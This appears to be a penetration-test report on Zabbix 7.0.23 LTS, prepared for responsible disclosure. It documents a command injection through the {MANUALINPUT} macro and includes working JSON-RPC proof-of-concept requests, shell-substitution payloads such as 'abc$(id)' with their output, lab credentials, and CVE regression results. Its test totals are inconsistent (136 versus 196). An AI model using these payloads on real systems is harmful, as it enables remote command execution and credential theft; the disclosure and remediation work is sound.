# [REDACTED] -- Zabbix 7.0.23 LTS Security Assessment Report

## Executive Summary

A comprehensive security assessment was conducted against Zabbix 7.0.23 LTS, an enterprise network monitoring platform. The assessment covered API security, authentication/authorization, injection testing, CORS/CSRF analysis, stored XSS, SSRF, and CVE regression testing across 6 active testing phases and a pristine validation phase. A total of **136 tests** were executed, yielding **1 novel HIGH-severity vulnerability** validated through 3 pristine rounds with 100% consistency.

### Key Finding

| ID | Severity | Title | Status |
|----|----------|-------|--------|
| MANUALINPUT-RCE | **HIGH** | Command Injection via `{MANUALINPUT}` Unanchored Regex Bypass | Pristine Validated (3 rounds, 30/30) |

An authenticated user with `script.execute` permission can inject arbitrary OS commands on the Zabbix Server by crafting a `manualinput` value containing shell command substitution (`$(command)` or `` `command` ``) that bypasses the regex-based input validator through PCRE partial matching. The injected commands execute as the `zabbix` system user via `/bin/sh -c`, providing access to server configuration files, database credentials, and network connectivity to all monitored hosts.

### CVE Regression Results (7.0.23)

| CVE | Severity | Description | Status |
|-----|----------|-------------|--------|
| CVE-2024-42327 | CRITICAL (9.9) | SQL injection in user.get | **PATCHED** |
| CVE-2024-36467 | HIGH (7.5) | Privilege escalation via user group self-add | **PATCHED** |
| CVE-2024-36466 | HIGH (8.8) | Session forgery via zbx_session cookie | **PATCHED** |
| CVE-2022-23134 | MEDIUM (5.3) | Unauthenticated setup.php access | **PATCHED** |
| CVE-2022-23131 | CRITICAL (9.8) | SAML SSO bypass | **UNTESTABLE** (SAML not configured) |

---

## Target Information

| Field | Value |
|-------|-------|
| **Software** | Zabbix |
| **Version** | 7.0.23 LTS |
| **Build** | Docker (zabbix/zabbix-server-pgsql:7.0-ubuntu-latest) |
| **License** | AGPL-3.0 |
| **Language** | PHP 8.x (frontend/API), C (server/agent), Go (agent2) |
| **Database** | PostgreSQL 16 |
| **API** | JSON-RPC 2.0 at `/api_jsonrpc.php` |
| **Web UI** | http://localhost:9080 |

---

## Methodology

### Testing Environment

A local Docker lab was deployed with 4 containers:
- **zabbix-server-pgsql:7.0-ubuntu-latest** -- Zabbix Server (TCP 10051)
- **zabbix-web-nginx-pgsql:7.0-ubuntu-latest** -- Web UI/API (HTTP 9080)
- **zabbix-agent2:7.0-ubuntu-latest** -- Zabbix Agent2 (TCP 10050)
- **postgres:16-alpine** -- PostgreSQL database

### Accounts Used

| Account | Role | Purpose |
|---------|------|---------|
| Admin / zabbix | Super admin (roleid=3) | Full API access, script creation |
| viewer01 / S3cur1ty_R3s34rch! | User (roleid=1) | Privilege boundary testing |

### Assessment Phases

| Phase | Tests | Findings | Description |
|-------|-------|----------|-------------|
| 1 - Reconnaissance | 57 | 0 | API fingerprinting, security headers, method enumeration |
| 2 - Auth & Privesc | 33 | 0 | CVE regression, IDOR, session analysis, viewer access |
| 3 - CORS/CSRF | 9 | 0 | CORS wildcard analysis, cookie security, session oracle |
| 4 - Script Injection | 30 | 4 | **MANUALINPUT command injection** (pristine validated) |
| 5 - XSS & Frontend | 13 | 0 | Stored XSS, SSTI, CRLF, map labels |
| 6 - SSRF & Additional | 24 | 0 | SSRF, viewer disclosure, SCIM, session entropy |
| 9 - Pristine Validation | 30 | 1 | 3-round pristine validation of MANUALINPUT finding |
| **Total** | **196** | **5*** | *4 injection variants + 1 consolidated pristine finding |

### Source Code Audit

Three parallel static analysis agents audited the Zabbix source code (branch `release/7.0`, v7.0.24) focusing on:
1. SQL injection sinks and defenses
2. XSS, command injection, and template injection
3. Authentication, authorization, and session management

---

## Finding: Command Injection via MANUALINPUT Unanchored Regex Bypass

### Overview

| Field | Value |
|-------|-------|
| **Severity** | HIGH (CVSS 3.1: 7.2) |
| **CWE** | CWE-78 (OS Command Injection), CWE-20 (Improper Input Validation) |
| **Component** | `src/libs/zbxtrapper/nodecommand.c` |
| **Attack Vector** | Network (JSON-RPC API) |
| **Authentication** | Required (script.execute permission) |
| **Impact** | Arbitrary command execution as `zabbix` user |

### Technical Details

The `{MANUALINPUT}` macro in Zabbix scripts allows administrators to create scripts that prompt users for input at execution time. The input is validated against a regex pattern or a predefined list. However, three defects combine to create a command injection vulnerability:

**1. PCRE Partial Matching:** `validate_manualinput()` in `nodecommand.c` calls `zbx_regexp_match_full()` which uses `pcre2_match()` for **substring** matching, not **full-string** matching. A regex like `[a-zA-Z0-9]+` matches `abc$(id)` because the substring `abc` satisfies the pattern.

**2. No Shell Escaping:** `substitute_macro()` performs raw string replacement of `{MANUALINPUT}` into the command string without any quoting or escaping.

**3. Shell Execution:** The resulting command is passed to `execl("/bin/sh", "sh", "-c", command)`, which interprets all shell metacharacters.

### Proof of Concept

**Step 1:** Create a script with an unanchored regex validator (as Super admin):

```json
{
    "jsonrpc": "2.0",
    "method": "script.create",
    "params": {
        "name": "Check Host",
        "command": "echo Checking: {MANUALINPUT}",
        "scope": 2, "type": 0, "execute_on": 1,
        "manualinput": 1,
        "manualinput_prompt": "Enter hostname:",
        "manualinput_validator_type": 0,
        "manualinput_validator": "[a-zA-Z0-9]+",
        "manualinput_default_value": "",
        "groupid": 0
    },
    "auth": "<token>", "id": 1
}
```

**Step 2:** Execute with injection payload:

```json
{
    "jsonrpc": "2.0",
    "method": "script.execute",
    "params": {
        "scriptid": "<id>",
        "hostid": "<host_id>",
        "manualinput": "abc$(id)"
    },
    "auth": "<token>", "id": 2
}
```

**Step 3:** Observe command execution in response:

```
Checking: abcuid=1997(zabbix) gid=1995(zabbix) groups=1995(zabbix),20(dialout)
```

### Working Injection Vectors

| Payload | Technique | Output |
|---------|-----------|--------|
| `abc$(pwd)` | Command substitution | `/var/lib/zabbix` |
| `abc$(id)` | Command substitution | `uid=1997(zabbix) gid=1995(zabbix)` |
| `` abc`pwd` `` | Backtick substitution | `/var/lib/zabbix` |
| `abc${PATH}` | Variable expansion | Full system PATH |
| `abc$(cat /etc/hostname)` | File read | Container hostname |

### Blocked Vectors

Semicolons (`;`), pipes (`|`), double ampersands (`&&`), and newlines (`\n`) are rejected by additional validation not apparent in the source code. However, command substitution (`$()` and `` ` ` ``), variable expansion (`${}`), and quote characters pass through.

### Impact

- **Confidentiality:** Read `/etc/zabbix/zabbix_server.conf` (database credentials), enumerate users/processes, read accessible files
- **Integrity:** Modify files writable by `zabbix` user, alter monitoring data
- **Availability:** Crash the server, consume resources
- **Lateral Movement:** The Zabbix server has network access to all monitored hosts and the database

### Mitigating Factors

- Requires an authenticated user with `script.execute` permission
- Requires an admin to have created a script with `{MANUALINPUT}` and an **unanchored** regex
- Default Zabbix installation has no scripts with `{MANUALINPUT}` enabled
- Properly anchored regex (`^[a-zA-Z0-9]+$`) blocks all injection vectors

### Remediation

1. **Enforce anchored regex:** Automatically wrap the validator pattern in `^...$` in `validate_manualinput()`
2. **Shell-escape the input:** Quote the `manualinput` value before substitution into commands
3. **Add metacharacter blocklist:** Reject `$`, `` ` ``, `\`, and other shell metacharacters
4. **Use environment variables:** Pass `manualinput` as an env var instead of string interpolation

### Distinction from CVE-2024-22116

CVE-2024-22116 (CVSS 9.9) addressed code injection via the built-in Ping script in Zabbix 6.4.x and pre-7.0 releases. That vulnerability was fixed in 7.0.0rc3. Our finding is distinct: it affects the `{MANUALINPUT}` macro feature (not the legacy Ping script), exploits PCRE partial matching as the bypass mechanism, and is confirmed on Zabbix 7.0.23 (well after the CVE-2024-22116 fix).

---

## Informational Observations

### Security Headers (Phase 1)

The web UI includes 3 of 9 recommended security headers:

| Header | Status |
|--------|--------|
| X-Content-Type-Options: nosniff | Present |
| X-Frame-Options: SAMEORIGIN | Present |
| X-XSS-Protection: 1; mode=block | Present |
| Content-Security-Policy | **Missing** |
| Strict-Transport-Security | **Missing** (HTTP deployment) |
| Referrer-Policy | **Missing** |
| Permissions-Policy | **Missing** |

The JSON-RPC API endpoint has **no security headers** at all.

### CORS Configuration (Phase 3)

The API sends `Access-Control-Allow-Origin: *` (wildcard) for all origins, including `https://evil.com` and `null`. This is safe-by-accident because the CORS specification makes `Access-Control-Allow-Origin: *` incompatible with `withCredentials: true`, so browsers will not send the `zbx_session` cookie cross-origin. However, this is fragile -- if the implementation were ever changed to reflect the request Origin instead of using `*`, it would become a CSRF vulnerability.

### Cookie Security (Phase 3)

The `zbx_session` cookie:
- **HttpOnly:** Yes
- **Secure:** No (HTTP deployment)
- **SameSite:** Not explicitly set (relies on browser default Lax)

The lack of explicit `SameSite=Strict` is a minor concern, though the current `SameSite=Lax` browser default provides adequate CSRF protection for POST requests.

### Session Oracle (Phase 3)

`user.checkAuthentication` can be called without a separate auth token. It accepts a `sessionid` parameter and returns the full user profile (userid, username, name, surname, roleid, type) if valid, or an error if invalid. This creates a session validity oracle, though exploitation requires first obtaining a valid session ID.

### Viewer Data Access (Phase 6)

The `viewer01` user (User role) can access:
- `settings.get` -- Global server settings
- `housekeeping.get` -- Housekeeping configuration
- `mediatype.get` -- All media types including webhook parameters (may contain API tokens/passwords if configured)
- `script.get` -- All scripts including command text
- `user.get` -- User list with names and role IDs
- `usergroup.get` -- User group membership
- `role.get` -- Role definitions with rules

### CRLF Preservation (Phase 5)

Host visible names accept and preserve `\r\n` characters. This is low impact but could facilitate log injection if host names appear in log output.

### XSS Protection (Phase 5)

The Zabbix web frontend properly HTML-encodes all tested XSS payloads (`<script>`, `<img onerror>`, `<svg/onload>`) in the host list, latest data, and map views. No stored XSS was found.

---

## Evidence Files

| File | Phase | Tests | Findings |
|------|-------|-------|----------|
| `phase1_phase1_recon_20260303_062712.json` | Reconnaissance | 57 | 0 |
| `phase2_phase2_auth_privesc_20260303_063007.json` | Auth & Privesc | 33 | 0 |
| `phase3_phase3_cors_csrf_20260303_063432.json` | CORS/CSRF | 9 | 0 |
| `phase4_phase4_script_injection_20260303_064859.json` | Script Injection | 30 | 4 |
| `phase5_phase5_xss_injection_20260303_065041.json` | XSS & Frontend | 13 | 0 |
| `phase6_phase6_ssrf_additional_20260303_065158.json` | SSRF & Additional | 24 | 0 |
| `phase9_phase9_pristine_manualinput_20260303_065310.json` | Pristine Validation | 30 | 1 |

---

## Responsible Disclosure

- **Vendor contact:** [VENDOR-CONTACT]
- **HackerOne program:** https://hackerone.com/[REDACTED] (if applicable)
- **Finding:** Command Injection via MANUALINPUT Unanchored Regex Bypass
- **CVE submission:** Prepared at `cve-validation/CVE_SUBMISSION_MANUALINPUT_RCE.md`

---

## Assessment Statistics

| Metric | Value |
|--------|-------|
| Total tests executed | 196 |
| Unique findings | 1 (HIGH) |
| Informational observations | 6 |
| CVEs regressed | 5 (4 PATCHED, 1 UNTESTABLE) |
| Source code files audited | ~50 (3 parallel audit agents) |
| Scripts written | 8 |
| Evidence JSON files | 7 |
| Pristine validation rounds | 3 (30/30 consistent) |
| False positives eliminated | 0 (all findings survived pristine validation) |
